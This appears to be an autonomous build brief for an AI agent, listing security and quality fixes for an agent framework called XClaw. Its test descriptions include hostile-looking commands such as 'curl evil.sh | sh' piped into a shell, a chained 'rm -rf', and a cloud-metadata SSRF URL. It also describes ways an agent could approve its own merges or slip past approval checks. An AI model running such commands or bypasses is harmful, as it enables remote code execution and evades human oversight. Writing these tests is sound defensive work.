# GROK AUTONOMOUS BUILD BRIEF — XClaw to 10/10

**Date:** 2026-08-12
**Input:** the independent 10-agent design review of HEAD `9c1f7a0` (`docs/DESIGN-REVIEW-2026-08-12.md`, PR #10). Current verdict: **4.2/10** mean maturity, ~6–9 months behind today's OSS frontier.
**Operator of this brief:** Grok, working **fully autonomously**. No human is watching. Every instruction here assumes you will never ask a question you can answer by reading code or running a command.
**Mission:** execute the work packages below until every line of the 10/10 rubric (§3) passes by command, not by claim.

This document is self-contained. You do not need the review doc to execute it — every defect below carries its own `file:line` evidence, fix shape, and executable Definition-of-Done (DoD). The review doc is the *why*; this is the *what and prove-it*.

---

## 0. Mission

Take XClaw from a 4.2/10 prototype — real, boots, 955/959 tests green, but with unenforced security, a serial 2024-era loop, a default-open auth plane, and a 17MB unreproducible bundle at its core — to a system that would score 10/10 against the August-2027 bar defined in the design review. "Done" is not a feeling; it is §3 passing end-to-end on a clean checkout.

---

## 1. Operating contract (non-negotiable)

1. **Never ask. Verify.** You have the repo, a shell, and tests. Any question answerable by `grep`, `node --test`, or `curl` is yours to answer. Asking a human is a defect.
2. **Banned vocabulary:** "should work", "probably", "likely fixed", "seems fine". Either you ran it and cite the output, or you label it `UNVERIFIED` and it does not count toward any DoD.
3. **One branch per work package, one PR per branch**, merged only when that package's DoD passes AND the global gates (§4) pass. `main` stays deployable after every merge.
4. **Test-first for every defect:** before fixing, write a failing test that reproduces the defect (the review already gives you the repro for several — use them). The fix flips the test green. The test stays forever as the anti-regression guard.
5. **No fabricated evidence.** This repo has a history of it (backdated soak nights, versioning theater, softened release gates — see Phase 0). You remove fabrication machinery; you never add any. A gate that cannot honestly pass stays red and gets listed in `docs/GROK-PROGRESS.md` as red.
6. **Never delete a working capability.** Dead code (§ evidence says "imported by nothing") may be deleted; working-but-ugly code gets refactored behind its existing tests. When unsure whether something is dead, prove it with an import-graph grep and record the grep in the commit message.
7. **SCAFFOLD discipline:** every heuristic you keep that exists only to compensate for current-model weakness gets a `// SCAFFOLD: <reason>` marker. Phase 8 deletes the rest.
8. **Progress ledger:** maintain `docs/GROK-PROGRESS.md`. One row per work package: `status (red/amber/green) | evidence (command + output digest) | commit`. Update it in the same commit as the work. This file is how anyone — including future you after a context reset — resumes.
9. **Resume protocol:** on any restart, read `docs/GROK-PROGRESS.md` first, re-run the DoD commands of every package marked green (trust nothing), then continue from the first non-green package.
10. **Bundle rule:** `src/computer/xclaw-server.mjs` (17MB, 64% of the repo, source not in repo) is read-only legacy. You never edit it, never regenerate it, and Phase 6 progressively strands it. New capability goes in first-party modules only.

---

## 2. Ground truth — where the repo actually stands (verified 2026-08-12)

- **Tests:** `npm test` → 959 tests, 955 pass, **4 fail** at HEAD: 2× `test/browser-mitm.test.mjs` (env leakage — assumes no `~/.mitmproxy` on the host), 2× `test/computer-strategy-c.test.mjs` (genuine defect: build-stamp assertion `undefined !== false`).
- **CI:** `.github/workflows/eval-regression.yml:31` uses `secrets` in a job-level `if` — illegal in GitHub Actions, so **the whole workflow file is invalid and neither the live nor the unit job has ever run**. Effective eval CI coverage: zero.
- **The flagship security test never runs:** `test/system-run-plan.test.mjs:12` imports `PLAN_VERSION` as a named export that does not exist (`src/security/system-run-plan.mjs:23` — it's only in the default export). SyntaxError; 0 of its 7 tests have executed since the refactor.
- **Security is observability cosplaying as enforcement** (details in Phase 1).
- **Line provenance:** 64.2% opaque bundle, 17.2% copied skill packs, ~16% plausibly first-party. Judge your own diffs accordingly: your work should grow the first-party fraction and shrink dependence on the bundle.
- **What is genuinely good (never regress):** plan-fingerprint approval binding (the *idea* — the enforcement is what's missing), receipts-as-gates in the swarm, the context-economics pipeline (reversible tool-result offload, prefix-stability assertions, pressure-adaptive eviction), resumable jobs with checkpoint halving, the honest `doctor` command, 200 real test files.

---

## 3. The 10/10 rubric — executable

XClaw is 10/10 when **all** of the following pass on a clean checkout of `main`. Each is a command or a mechanically checkable property, not an opinion. Run the full rubric after every phase merge; keep the latest transcript in `docs/GROK-PROGRESS.md`.

| # | Criterion | Proof command / check |
|---|---|---|
| R1 | Test suite 100% green, on a clean machine AND a machine with `~/.mitmproxy` present | `npm test` → 0 fail (and total ≥ 1100: every phase adds tests) |
| R2 | All GitHub workflows valid and running | `actionlint` clean; latest push shows eval unit job executed with conclusion `success` |
| R3 | Plan binding enforced at spawn | Phase 1 tamper test: mutate args after approval → spawn receives pinned plan or run aborts. Test exists and passes |
| R4 | No auto-approve path skips revalidation | Phase 1 SLA test passes |
| R5 | Conversation history threads across turns | Phase 3 E2E: two-message session, second answer provably uses first message's content, via real gateway HTTP |
| R6 | Progress-based loop guard; no post-run pipeline skip | Phase 3 tests: productive 40-call run completes; stuck run stops with `loop_guard` result event, ledger+turnState persisted |
| R7 | Auth default-deny | Phase 4 test: unauthenticated request to a route added to the router but NOT to any list → 401. WS upgrade without token → rejected |
| R8 | No plaintext-equivalent token store | Phase 4: KDF in place; test proves gateway token alone can no longer derive the store key from a captured file |
| R9 | Swarm merge cannot self-approve or bypass approval in prod profile | Phase 2 tests (early-merge + self-approve + committed-work + checkOnly) all pass |
| R10 | Anthropic streaming is real | Phase 5 test: SSE deltas observed from the anthropic-messages provider against a mock SSE server; cache_control blocks reach the wire un-stringified |
| R11 | Provider failover recovers | Phase 5 half-open test passes; no cross-vendor credential fallback (test proves an OpenAI call never carries an xAI key) |
| R12 | Bash execution sandboxed + SSRF blocked | Phase 6: env-scrubbed spawn test (secret in parent env not visible in child); `fetchUrl('http://169.254.169.254/')` → refused, test passes |
| R13 | MCP tools callable by the agent | Phase 7 E2E: stdio MCP server registered → its tool appears in the agent tool list and a loop run calls it successfully |
| R14 | Memory recall is indexed, not substring-over-500-events | Phase 7 DoD (FTS + bounded append) passes |
| R15 | Bitter-lesson sweep complete | Phase 8 checklist: each named heuristic deleted or SCAFFOLD-marked; `grep -rn "SCAFFOLD"` output reviewed and listed in progress ledger |
| R16 | Cron/jobs survive restart | Phase 9 test: schedule job → SIGKILL gateway → restart → job still scheduled and fires |
| R17 | No fabricated gates remain | soak backdating removed; release-gate exit-code softening removed; baseline creep fixed — all with tests |
| R18 | Docs match reality | `docs/GROK-PROGRESS.md` current; README claims spot-checked against rubric transcript; CHANGELOG entries dated truthfully from this point forward |

Scoring: each R-line green = pass. 18/18 = 10/10. Anything less: score = `round(10 × green/18)` — put that number, honestly computed, at the top of the progress ledger after every phase.

---

## 4. Global gates — run before every merge

```bash
npm test                                   # 0 failures, count must not decrease
node scripts/eval-regression.mjs           # exit 0
node bin/xclaw.mjs doctor                  # exit 0
node --test test/system-run-plan.test.mjs  # loads and passes (after Phase 0)
git status --porcelain                     # empty after commit — no stray artifacts
```

Plus: the diff contains only lines justified by the work package (no drive-by edits outside touched files), and every new behavior has a test in the same PR.

---

## 5. Work packages

Ordered by leverage: truth infrastructure first (you cannot trust any later gate until the gates themselves are honest), then the two live-verified security bypass clusters, then table stakes, then the frontier work.

### Phase 0 — Make the truth infrastructure honest

The repo's own verification machinery lies. Until this phase is done, "green" means nothing, so this comes first.

| # | Defect | Evidence | Fix shape |
|---|---|---|---|
| 0.1 | `secrets` in job-level `if` invalidates the entire eval workflow; no eval job has ever run | `.github/workflows/eval-regression.yml:31` | Gate on a job output or `env:` indirection (e.g. a `check-secrets` job that exports `has_key`), or run the unit job unconditionally and only skip the live job via step-level env check |
| 0.2 | Flagship security test file cannot load (`PLAN_VERSION` named-import of a default-only export) | `test/system-run-plan.test.mjs:12` vs `src/security/system-run-plan.mjs:23` | Export `PLAN_VERSION` as a named export; run the file; fix whatever its 7 tests then reveal |
| 0.3 | 2 genuine Strategy C failures: build-stamp assertion `undefined !== false` | `test/computer-strategy-c.test.mjs` | Make the build stamp write the asserted field; do not weaken the assertion |
| 0.4 | 2 env-leakage failures: mitm tests assume no `~/.mitmproxy` on host | `test/browser-mitm.test.mjs` | Point cert discovery at an injectable root (env var / parameter) and isolate in tests via tmpdir |
| 0.5 | Scheduled "daily" eval actually runs every 60s with default config: `ensureEvalCronJob` passes `everyMs`/`_cfg`, scheduler reads `intervalMs`/`cfg` | `src/cron/eval-job.mjs:130-136` vs `src/cron/scheduler.mjs:135-139,176` | Align the parameter names; add an integration test that registers the job and asserts the actual interval |
| 0.6 | Fabricated soak evidence: one live pass backdated into N−1 synthetic "nights"; gate counts distinct dates | `scripts/soak-multinight.mjs:72-78`, `src/eval/soak.mjs:84-87` | Delete the backdating; a soak night is only countable if its timestamp is a real run. Gate stays red until real nights accumulate — that is correct behavior |
| 0.7 | Release gate remaps exit code 1 → 0 ("warnings only") for its own required steps | `scripts/release-gate.mjs:143-146,199-200` | Remove the remap. If a step is genuinely advisory, mark it advisory explicitly in gate config, never by silently rewriting exit codes |
| 0.8 | Baseline creep: every scheduled eval overwrites `eval/baselines/main.json`; regression compares aggregate passRate only | `src/cron/eval-job.mjs:73-81`, `src/eval/cli.mjs:49-59`, `scripts/eval-ci.mjs:80-88` | Baselines update only via explicit command (or on tagged release); regression check compares per-case, not aggregate |
| 0.9 | Eval scorer asserts surface form (`replyContains`, literal `'a + b'` in hard-fix-sum) | `src/eval/scorer.mjs:45-55`, `eval/cases/hard.json` | Score behavior: run the fixed code / check the test passes, not the string shape of the diff. Per-case turn budgets become generous defaults, not tuned caps |
| 0.10 | Release gate greps for human comment strings as proof of capability ("bundle-markers") | `scripts/release-gate.mjs:149-169` | Replace with a behavioral probe or delete the step |

**DoD Phase 0:**
```bash
actionlint                                  # 0 errors
npm test                                    # 959+ tests, 0 fail — including on a host WITH ~/.mitmproxy
node --test test/system-run-plan.test.mjs   # 7/7 pass
grep -n "backdat" scripts/soak-multinight.mjs   # no fabrication path remains
node scripts/release-gate.mjs || echo "honest red is acceptable"  # no exit-code remapping in source
```

### Phase 1 — Enforce the plan binding (the crown jewel is currently a placebo)

The frozen `systemRunPlan` + fingerprint approval (PRs #4/#5) is XClaw's best original idea — no competitor has it. It is also **not enforced anywhere on the execution path**. This phase makes it real.

| # | Defect | Evidence | Fix shape |
|---|---|---|---|
| 1.1 | After approval, the loop executes the ORIGINAL args; the computer plane spawns `/bin/bash -lc <raw command>`. The frozen plan never reaches the spawn | `src/agent/loop.mjs:869-878`; `src/computer/modules/bash-tool.mjs:38,58` | The approved, frozen plan object (pinned exe + argv) must be the ONLY thing passed to the computer plane for exec-class tools. Spawn from the pin. Any mismatch between pinned plan and requested action → abort with a `plan_mismatch` result event |
| 1.2 | SLA auto-approve resolves `ok:true` with zero revalidation — the longest TOCTOU window has no check at all | `src/security/approvals.mjs:42-50` | SLA path calls `revalidatePlan` immediately before resolve; on failure → deny with reason |
| 1.3 | TOCTOU narrowed, not closed: `revalidatePlan` runs at decide() in the gateway; spawn happens later on the computer plane | `src/security/approvals.mjs:270-285`; `src/security/system-run-plan.mjs:264-272` | Revalidate (exe realpath + fingerprint) ON the computer plane, immediately pre-spawn, in the same process that spawns |
| 1.4 | PR #5 observability is dead code: `src/agent/secure-tool-call.mjs` imported only by its own test; live loop emits `approval_required` without planFingerprint | grep: only `test/secure-tool-call.test.mjs:7` imports it; `src/agent/loop.mjs:675-685,736-741` | Wire `secure-tool-call` into the live loop path (or fold its logic in); every approval event and toolTrace entry carries the fingerprint |
| 1.5 | Naive argv parser: `cmd.trim().split(/\s+/)` misbinds every quoted/piped/compound command | `src/security/system-run-plan.mjs:74-77` | Real shell-grammar parse (POSIX tokenizer). Compound commands (`;`, `&&`, `|`, `$()`) produce a plan per pipeline stage or an explicit `compound` classification that always requires approval |
| 1.6 | Exec allowlist first-token/glob escape: `git *` matches `git status; curl evil \| sh` | `src/security/exec-allowlist-pattern.mjs:117-129` | Allowlist decisions operate on the parsed AST from 1.5, never the raw string; any compound → most-restrictive rule wins |
| 1.7 | No durable trust: `/security/decide` one-shot boolean; the routes module that parses `allow-always` is itself unwired | `src/gateway/index.mjs:2141-2147`; `src/gateway/routes/security.mjs:26-99` | Wire the routes module in (delete inline duplicates); persist allow-always decisions keyed by (tool, pinned exe, arg-shape hash) with TTL |
| 1.8 | Two of three profiles ship with security fully off (`lab` default: autoApprove true, policy 'never') | `src/config/load.mjs:55-58`; `src/config/profiles.mjs:8,26` | Keep `lab` convenient but make the enforcement machinery ALWAYS run (plan pinning + revalidation happen even when approval auto-resolves) so prod/lab differ only in who approves, not in what is enforced |
| 1.9 | Triplicated hardcoded EXEC_TOOLS name-sets; static TOOL_RISK name→risk table; regex writability sniffing; hardcoded arg-key guessing lists | `src/security/system-run-plan.mjs:26-33`, `src/security/approvals.mjs:77,108-110`, `src/security/policy-matrix.mjs:5-24`, `src/security/sandbox.mjs:61,66`, `system-run-plan.mjs:145` | Single source of truth: capability metadata declared on the tool registration (`{exec: true, writes: true, riskClass}`) consumed everywhere. Delete the string lists. `policy-matrix.mjs` gets wired or deleted (it is currently test-only) |

**DoD Phase 1** — all as new tests in `test/`:
```text
T1 tamper test: approve plan for `echo safe`, mutate call args to `curl evil.sh | sh` post-approval → spawn never happens, run emits plan_mismatch. (This is R3.)
T2 SLA test: SLA auto-approve path with a plan whose exe was swapped on disk between request and resolve → denied.
T3 compound test: `git status; rm -rf /tmp/x` against allowlist entry `git *` → requires approval (not auto-allowed).
T4 fingerprint-observability test: live loop run → approval_required event carries planFingerprint; toolTrace entry carries it.
T5 allow-always test: decide allow-always → identical action later auto-approved; different exe path with same name → NOT auto-approved.
npm test green; node --test test/system-run-plan.test.mjs 7/7 (+ the new tests).
```

### Phase 2 — Swarm merge correctness (two live-verified P0 bypasses)

| # | Defect | Evidence | Fix shape |
|---|---|---|---|
| 2.1 | **P0:** early-merge "strategy A" forces `autoMerge:true` into `resolveMergePolicy`, making its own prod-off guard unreachable | `src/agents/swarm-run.mjs:741-744,1085-1098` | Resolve policy from cfg + input WITHOUT forcing; early merge only proceeds when resolved policy actually allows it; prod profile → never |
| 2.2 | **P0:** the agent can approve its own merges: `xclaw_swarm_merge_approve` is model-callable and the approval gate only names bash/shell tools | `src/agent/loop.mjs:814-827`; `src/security/approvals.mjs:76-78` | Merge-approve is never model-callable (remove from the loop's tool list) OR requires an out-of-band principal ≠ the proposing run. Enforce via capability metadata from 1.9 |
| 2.3 | Committed subagent work silently lost: `worktreeDiff` diffs vs HEAD only; if the agent commits (xclaw even installs a commit hook), diff is empty → NOOP merge | `src/agents/worktree.mjs:178-199,333-345,73-101` | Diff from the worktree's merge-base to its branch tip (committed + uncommitted); or merge the branch. Test: subagent commits a change → merge lands it |
| 2.4 | checkOnly phase has side effects: `fs.mkdir` before the guard; untracked-dir copy branch has no guard | `src/agents/worktree.mjs:360-370` | No writes of any kind under checkOnly. Test asserts main-repo mtime/inode set unchanged after a check-only pass |
| 2.5 | Lossy handoff: upstream results truncated to 1800 chars, join summary to 1500 | `src/agents/swarm-run.mjs:82-83,253-273` | Structured handoff: artifact refs (files + git refs + receipts) plus summary; downstream agents read artifacts via tools instead of a prose slice |
| 2.6 | Demo-scale ceilings and barriers: 8 nodes / 5 parallel hard caps, wave + intra-wave batch barriers, no resume journal | `src/agents/swarm-run.mjs:817-824,1068-1077`; `swarm-store.mjs:91-108` | Dependency-driven scheduling (a node runs when its deps are done, period); caps become config; append-only run journal enabling resume of a killed swarm |
| 2.7 | Critic gate = keyword regex over prose; voting = greedy JSON regex + 8 tie-break strategies; receipts guess artifacts by filename regex over prose; receiptVoteWeight magic numbers | `swarm-merge.mjs:107-114`; `swarm-vote.mjs:10-55,92-191`; `swarm-receipt.mjs:70-79,255-267` | Structured output: critics and voters return typed verdicts via a tool call (schema-validated), not parsed prose. Receipts derive artifacts from the tool trace + `git diff --name-only`, not regex. Delete the tie-break zoo; keep majority + explicit escalation |

**DoD Phase 2:** tests for 2.1–2.4 exactly as described (the review's repro for 2.4 printed `CHECK-ONLY created …` — turn that repro into the test); an 8-node swarm run with one slow node completes without wave-barrier stalls (timing-asserted); kill -9 mid-swarm → resume completes remaining nodes. R9 green.

### Phase 3 — Agent loop table stakes

| # | Defect | Evidence | Fix shape |
|---|---|---|---|
| 3.1 | **The defining gap:** no conversation-history threading — every inbound message builds `[system, user]` fresh; webchat stores `session.messages` but never feeds them back | `src/agent/loop.mjs:93-104,426-429`; `src/channels/base.mjs:33-43`; `src/channels/webchat/index.mjs:136-166` | `runAgentLoop` accepts a transcript; channels pass session history; context-economics pipeline (already built!) manages its size. This single fix moves the product a generation |
| 3.2 | Hard call-count circuit breaker (prod 25) with no progress reset; trips on `history.length` which never resets | `src/agent/openclaw-loop/detection.mjs:85-87,239-247`; `src/config/profiles.mjs:39,80` | Progress-based guard: reset the window on evidence of progress (new file written, test count changed, distinct tool/arg signatures). Absolute cap becomes a config safety net at 10× current values |
| 3.3 | Loop-guard stop THROWS out of `runAgentLoop` (try has no catch) — skips turnState, suggestions, usage-ledger persistence | `src/agent/loop.mjs:656-668,484-968,970-1113` | Guard stop is a normal result (`stopReason:'loop_guard'`) flowing through the full post-run pipeline |
| 3.4 | `guard.record` never passes details → ported exit-code hashing / write-unchanged / unknown-tool-repeat detection is dead | `src/agent/loop.mjs:916,656`; `src/agent/openclaw-loop/detection.mjs:180-203,249-264` | Pass the outcome details; add tests for each detection mode |
| 3.5 | Strictly serial tool execution | `src/agent/loop.mjs:645` | Concurrency-classified parallel execution: read-only/safe tools fan out (`Promise.all` with a limit); mutating tools stay serial. Classification comes from the capability metadata of 1.9 |
| 3.6 | Tool dispatch is name-special-cased if/else chains; tools re-instantiated per call | `src/agent/loop.mjs:796-880` | Uniform tool interface (register once: `{name, schema, capabilities, execute, before?/after?}`); the loop knows no tool names |
| 3.7 | 2024-scale scattered turn budgets (15 default, subagents ≤8, swarm roles 4–8, jobs halve on resume) | `src/agent/loop.mjs:112`; `src/agents/spawn.mjs:160`; `src/agents/swarm-run.mjs:33-80`; `src/jobs/checkpoint.mjs:77` | One budget policy module; defaults sized for long-horizon work (≥100), guarded by the Phase 3.2 progress guard rather than small numbers |

**DoD Phase 3:** R5 E2E via real gateway HTTP (start gateway, POST two messages in one session, second reply provably references content only present in the first — assert on a nonce word); R6 tests; parallelism test (3 read-only tool calls complete in ~max(t) not sum(t), timing-asserted with stub tools); `npm test` green.

### Phase 4 — Gateway & auth plane

| # | Defect | Evidence | Fix shape |
|---|---|---|---|
| 4.1 | Deny-list default-OPEN auth: only enumerated prefixes protected; query-param token accepted; non-constant-time compare | `src/gateway/auth.mjs:57-106,116-122,124` | Default-deny middleware: every route requires auth unless explicitly marked public (`/ready`, `/version`, static UI). `timingSafeEqual`. Kill query-param tokens (webchat gets a real header/cookie — see 4.7) |
| 4.2 | WS hub `/ws/events` has NO auth on upgrade; hand-rolled RFC6455; CORS wildcard on SSE | `src/gateway/ws-hub.mjs:157-203,20`; `src/gateway/index.mjs:119`; `src/gateway/sse.mjs:19` | Token check at upgrade (before 101); origin allowlist; either harden the hand-rolled impl with tests (framing edge cases, no client keepalive today) or vendor a minimal audited ws implementation |
| 4.3 | 2,399-line router if-chain, ~90 inline routes, 3 near-identical ~250-line stream handlers, and a live copy-paste bug (startup SLO-monitor block duplicated inside POST /queue) | `src/gateway/index.mjs:1035-2332,187-367,376-679,682-870,1239-1254` | Route table (`method+path → handler module`), one shared stream-handler, delete the duplicated startup block. Mechanical refactor behind existing tests — no behavior change except the bug fix |
| 4.4 | No API versioning anywhere | `src/gateway/routes-map.mjs:4-59` | `/v1/` prefix on all API routes with legacy aliases kept one release; version field in every event envelope |
| 4.5 | No backpressure/limits outside /queue: `/agent/run`, `/swarm/run`, webchat all unbounded; `readBody` has no size limit | `src/gateway/index.mjs:1822-1852,1855-1872,124-130` | All run-starting routes go through the existing admission/queue machinery; global body-size limit; per-token rate limit |
| 4.6 | State layer races: module-Map sessions + 200ms debounced write; seats ledger RMW with no lock | `src/sessions/router.mjs:17-36`; `src/seats/manager.mjs:54-66,99-122` | Single writer with atomic rename (tmp+rename) and in-process mutex; crash-safe write-ahead of session events (append JSONL, snapshot periodically). SQLite acceptable if introduced as one module, ADR-documented |
| 4.7 | Token-store key = unsalted SHA-256 of the gateway bearer token (min 8 chars); webchat sends no Authorization header | `src/connected/token-crypto.mjs:10-18`; `ui/webchat/app.js:171-173` | scrypt/argon2id KDF with per-store random salt; storage key independent of the API bearer (generated once, stored 0600). Webchat authenticates properly |
| 4.8 | ~⅓ of src/auth is dead (cose-*, cookie-flags, secure-inject, idempotency, pkce imported by nothing outside src/auth) | import-graph grep 2026-08-12 | Wire or delete, file by file, each with its proving grep in the commit message |
| 4.9 | Seat "tenancy" derives from unauthenticated channel-supplied peer metadata | `src/seats/manager.mjs:25-31,36-52` | Seats bind to authenticated principals from 4.1's identity layer (token → principal → seat); channel peer metadata becomes advisory display info only |

**DoD Phase 4:** R7 test (register a scratch route, no list entry → 401; WS upgrade without token → no 101); R8 test; router file ≤ ~400 lines with routes in modules; `wc -l src/gateway/index.mjs` recorded in ledger; duplicated-block bug covered by a boot test asserting single SLO-monitor start; `npm test` green.

### Phase 5 — Providers

| # | Defect | Evidence | Fix shape |
|---|---|---|---|
| 5.1 | Anthropic `chatStream` silently falls back to non-streaming | `src/providers/anthropic-messages.mjs:349-351` | Real SSE parse of the Messages stream (message_start/content_block_delta/message_delta), tool-call streaming included |
| 5.2 | Cache breakpoints broken end-to-end: block-form system message is `JSON.stringify`ed before the wire | `src/tokens/cache-breakpoints.mjs:~113-124` vs `src/providers/anthropic-messages.mjs:86-90` | Preserve content-block arrays through to the request body; test asserts the wire payload contains `cache_control` blocks |
| 5.3 | No adapter registry — dispatcher is an if-statement inside the OpenAI factory | `src/agent/provider.mjs:30-48` | `registerApiAdapter(name, factory)`; both existing adapters register; custom providers can name an adapter |
| 5.4 | Custom providers excluded from model-ref chains (`parseModelRef` builtin-only) | `src/providers/registry.mjs:248-260` vs `:292-318` | Resolve prefixes against the merged provider set (builtin + cfg.providers) |
| 5.5 | Sticky failover, primary never re-probed | `src/providers/failover-router.mjs:187-223` | Half-open recovery: cooldown TTL per failed provider, probe on expiry, restore primary on success |
| 5.6 | Cross-vendor credential fallback ships the wrong vendor's secret; duplicated divergently in sync resolver | `src/providers/registry.mjs:383-393,437-445` | A provider only ever receives ITS OWN configured credential. Missing key = actionable error. Merge sync/async resolvers into one |
| 5.7 | Internal IR = OpenAI wire format; multimodal arrays pass to Anthropic unconverted | `src/providers/anthropic-messages.mjs:141-149` | Neutral internal message contract with explicit conversion at each adapter boundary; image parts converted or rejected loudly |
| 5.8 | Hardcoded `temperature: 0.2` everywhere; zero reasoning-parameter support; 400s don't fail over | `src/agent/provider.mjs:55,164` | Per-model parameter policy from the catalog (temperature optional, reasoning_effort / thinking budget passthrough); parameter-rejection 400s strip the offending param and retry once |
| 5.9 | No pricing/capability catalog → cost governor blind for 9 of 10 providers | `src/providers/registry.mjs:15-224`; `src/tokens/count.mjs:333-341` | Catalog gains $/Mtok in+out and modality flags; governor uses it; unknown-price models metered in tokens with a warning |
| 5.10 | Dead config `cfg.providers.routes` shadowed by hardcoded `PREFIX_ROUTES` | `src/config/defaults.mjs:505-512` vs `src/providers/registry.mjs:228-242` | Make the config the source of truth (defaults seed it); delete the hardcoded table |

**DoD Phase 5:** R10 + R11 tests against local mock servers (an SSE mock and a failing-then-healthy mock); wire-payload assertion for 5.2; `npm test` green.

### Phase 6 — Computer plane: sandbox, SSRF, and stranding the bundle

| # | Defect | Evidence | Fix shape |
|---|---|---|---|
| 6.1 | No sandbox: `/bin/bash -lc` with full inherited `process.env` (secrets included), "sandbox" = JS string path-prefix checks | `src/computer/modules/bash-tool.mjs:38-42,58-62`; `src/security/sandbox.mjs:24-76` | Minimum bar NOW: env-scrub (explicit passlist), cwd jail, resource limits. Real bar: bwrap + seccomp profile when available (feature-detect, fail closed in prod profile, honest WARN in lab). The Phase 1 pinned-plan spawn is the single choke point — sandbox there |
| 6.2 | SSRF hole: `fetchUrl` retrieves any URL — cloud metadata (169.254.169.254), loopback, internal ranges | `src/computer/modules/browser-tab-tool.mjs:26-73` | DNS-resolve then verify every resolved IP against a deny-floor (loopback, RFC1918, link-local, metadata) before connect; unconditional metadata block even in lab |
| 6.3 | Flagship "CLEAN editable BrowserService" is dead code referencing undefined variables (passes `node --check`, cannot run) | `src/computer/browser-service.mjs:309,422,483,518,558,602,607,624,657` | Decide by building: fix it into the real first-party CDP browser module (6.4) or delete it. No zombie flagships |
| 6.4 | Default engine's browser cannot browse: `xclaw_browser_tab` = http.request + regex htmlToText; jsCode/screenshot hard-error; the only real browser is the 17MB unreproducible vendored bundle | `src/computer/modules/browser-tab-tool.mjs:80-88,98-114`; `src/computer/SOURCE_OF_TRUTH.json:67-86`; `scripts/build-computer-bundle.mjs:11-13` | First-party CDP browser module (chrome-remote-interface class dependency, declared in package.json — the repo currently hides deps inside the bundle): navigate, snapshot, screenshot, evaluate, click/type. Wire it as the default engine. Every capability it takes over gets deleted from the bundle's advertised surface until the bundle is optional |
| 6.5 | Bundle is unreproducible core (64% of repo, source absent, build refuses to regenerate) | `src/computer/SOURCE_OF_TRUTH.json:67-86` | Strategy: strand it. Ledger `docs/BUNDLE-STRANDING.md` lists every capability currently reached through the bundle; each Phase 6/7 PR moves ≥1 to first-party; DoD for the phase = boot + browse + bash + screenshot with `XCLAW_DISABLE_LEGACY_BUNDLE=1` |
| 6.6 | Anti-bot biometric mimicry + regex "irreversibility" classifiers + JS motor-pattern blockers (hand-tuned heuristics) | `humanize.mjs`, `physics.mjs` DEFAULT_COMMIT_PATTERNS, `jscode-policy.mjs` MOTOR_PATTERNS | Phase 8 candidates: SCAFFOLD-mark now; the irreversibility judgment moves to the approval plane (model-judged) where Phase 1 machinery already gates it |

**DoD Phase 6:** R12 tests (env-scrub: parent exports `SECRET_CANARY=x`, child `env` output must not contain it; SSRF: metadata + loopback + RFC1918 URLs all refused, public URL passes against a local mock resolver); first-party browser E2E test headless (navigate to a local fixture server, screenshot bytes > 0, evaluate returns document.title); `XCLAW_DISABLE_LEGACY_BUNDLE=1 node bin/xclaw.mjs doctor` exit 0.

### Phase 7 — Memory, MCP, skills

| # | Defect | Evidence | Fix shape |
|---|---|---|---|
| 7.1 | MCP is decorative: client tools never merged into the agent tool list | `src/agent/loop.mjs:332-400`; `src/tools/connected-tools.mjs:80,200` | Registered MCP servers' tools join the uniform tool registry (Phase 3.6) with capability metadata; deferred loading (list names cheaply, fetch schema on first use) so 100 tools don't sit in the prompt |
| 7.2 | MCP client protocol-incompatible: HTTP JSON-RPC only, no initialize handshake, no stdio client, refetches tools/list per call | `src/mcp/client.mjs:9-28,53-54`; `src/mcp/handlers.mjs:69,74-76`; `src/mcp/stdio.mjs:49-52` | Real client: stdio + streamable-HTTP transports, initialize/initialized lifecycle, capability negotiation, tools/list cache with change notification |
| 7.3 | Memory recall = substring scoring over last ≤500 JSONL events; every append rewrites the whole file | `src/memory/recall.mjs:24-32,59-73`; `src/memory/durable.mjs:39-41,44-61` | True append (`fs.appendFile`); SQLite FTS5 index built incrementally alongside the JSONL (JSONL stays the source of truth); recall = FTS query + recency weighting |
| 7.4 | Skills: full bodies injected under a 6,000-char budget → mid-text truncation, silent drops | `src/skills/loader.mjs:282-290,253-294` | Progressive disclosure: inject name+description index only; the model reads full SKILL.md on demand via its read tool |
| 7.5 | Trust-boundary hole: memory-file walk to filesystem root, everything labeled "authoritative" | `src/skills/loader.mjs:194-230,269` | Walk stops at workspace root (or first VCS boundary); files outside the trusted root are excluded or explicitly labeled untrusted |
| 7.6 | "Skill learning" writes static boilerplate templates; preference memory = regex line matcher | `src/skills/propose.mjs:35-64,169-195,103`; `src/memory/preferences.mjs:17-28` | Either model-generated (draft → critique → revise loop producing a real SKILL.md) or deleted. The regex preference extractor is deleted; preference capture becomes an explicit model-invoked memory tool |
| 7.7 | Artifact "store" = 9 hardcoded directory names, no IDs/metadata/retention/download route | `src/artifacts/*`; `src/artifacts/browser.mjs:17-27` | Minimal honest store: content-addressed IDs, metadata JSON, authenticated download route, retention policy. Channels register their media dirs; no hardcoded names |
| 7.8 | Grok-sandbox env residue shipped as default skill roots (`/root/.grok/skills`, `/home/workdir/.grok/skills`) | `src/skills/loader.mjs:149-151` | Delete; skill roots come from config only |

**DoD Phase 7:** R13 E2E (spawn a 20-line stdio MCP fixture server in-test; agent loop run calls its tool and the result reaches the transcript); R14 (10k-event corpus: recall returns a known relevant event in <100ms; append does not rewrite the file — assert via inode/size delta); skills test (3 skills totaling >6,000 chars: none truncated, index injected, body fetched on demand); `npm test` green.

### Phase 8 — Bitter-lesson demolition sweep

Delete every remaining handcrafted heuristic that substitutes for model judgment. Each item: delete + cover with a test proving the capability still works through the general path, or SCAFFOLD-mark with a reason and a removal condition. The full list, by file:

- `src/agent/turn-state.mjs:14-42` — `inferGoal` regex intent classification → delete (the model states its own goal)
- `src/agent/suggestions.mjs:152-190` — `detectTurnClosure` regex continuation detection → delete
- `src/agent/suggestions.mjs` + `suggestion-feedback` — 816-line handcrafted suggestion engine with CTR priors → replace with one model call (or drop the feature; measure usage first via SIGNALS)
- `src/agent/tool-trace.mjs:74-84` — `collectArtifacts` regex path-scraping → derive from tool results/git status (Phase 2.7 already builds this)
- `src/agent/openclaw-loop/call-kind.mjs:9-20` — hardcoded poll-tool name list → tool metadata
- `src/sessions/session-key.mjs:18-22` — per-channel case special-cases → normalize in channel adapters
- `src/gateway/index.mjs:1007-1030` + `src/tokens/probes.mjs` — startup chars-per-token curve fitting → model-reported usage (keep `isCodeHeavy` in `src/tokens/count.mjs:57-64` as last-resort fallback, SCAFFOLD-marked)
